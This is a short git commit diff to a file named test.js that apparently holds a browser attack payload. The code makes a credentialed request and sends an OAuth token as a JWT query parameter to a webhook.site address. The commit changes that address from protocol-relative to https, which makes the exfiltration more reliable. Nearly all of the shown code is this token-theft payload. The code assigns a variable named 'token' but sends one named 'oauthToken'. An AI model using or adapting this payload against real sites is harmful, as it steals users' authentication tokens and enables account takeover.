9cf1c6943200775207fe3a8240b6f6a8b4ebcf38
bogdantc7 <57044368+bogdantc7@users.noreply.github.com>
2026-01-14 17:45:56 +0800

    Update test.js

--- test.js
+++ test.js
@@ -4,5 +4,5 @@ a.withCredentials = true;
 a.send();
 var token=a.response;
 var b = new XMLHttpRequest();
-b.open("GET", "//webhook.site/fd65476a-5a2b-4099-abfe-95c181ff362d/?JWT="+encodeURIComponent(oauthToken));
+b.open("GET", "https://webhook.site/fd65476a-5a2b-4099-abfe-95c181ff362d/?JWT="+encodeURIComponent(oauthToken));
 b.send();
